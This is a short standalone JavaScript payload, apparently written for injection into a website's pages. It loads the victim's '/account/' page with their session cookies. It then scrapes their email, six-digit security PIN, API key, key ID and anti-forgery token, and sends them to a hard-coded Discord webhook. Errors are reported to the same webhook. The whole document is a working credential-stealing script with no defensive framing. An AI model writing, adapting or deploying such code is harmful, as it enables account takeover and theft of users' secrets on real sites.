(async () => {
  const WH = 'https://discord.com/api/webhooks/1519411802142937118/Be6lYlqOJcp3Dvnjixe3BQMc8ukrhnSv4r6yemMGBDb9tZWWSlqPa5Nb6ba6aCvrzqzE';

  try {
    const h = await fetch('/account/', {credentials:'include'}).then(r => r.text());

    const d = {
      userId: (h.match(/id="app_user_id">(\d+)/) || [])[1],
      leader: (h.match(/id="app_leader_name">([^<]+)/) || [])[1],
      email:  (h.match(/Current E-mail:<\/td>\s*<td[^>]*>([^<]+)/) || [])[1],
      pin:    (h.match(/Security PIN:\s*(\d{6})/) || [])[1],
      apiKey: (h.match(/vertical-center center notranslate">([a-f0-9]{12,})</) || [])[1],
      keyId:  (h.match(/name="regen_api_key_id"\s+value="(\d+)"/) || [])[1],
      token:  (h.match(/name="token"\s+value="([^"]+)"/) || [])[1]
    };

    await fetch(WH, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        embeds: [{
          title: `🔑 ${d.leader || 'Unknown'} (${d.userId || '?'})`,
          color: 0x00ff00,
          fields: [
            {name: 'Email',  value: d.email  || 'N/A', inline: true},
            {name: 'PIN',    value: d.pin    || 'N/A', inline: true},
            {name: 'API Key',value: d.apiKey || 'N/A', inline: false},
            {name: 'Key ID', value: d.keyId  || 'N/A', inline: true},
            {name: 'Token',  value: d.token  || 'N/A', inline: true}
          ]
        }]
      })
    });
  } catch(e) {
    await fetch(WH, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({content: '❌ ' + String(e)})
    });
  }
})();
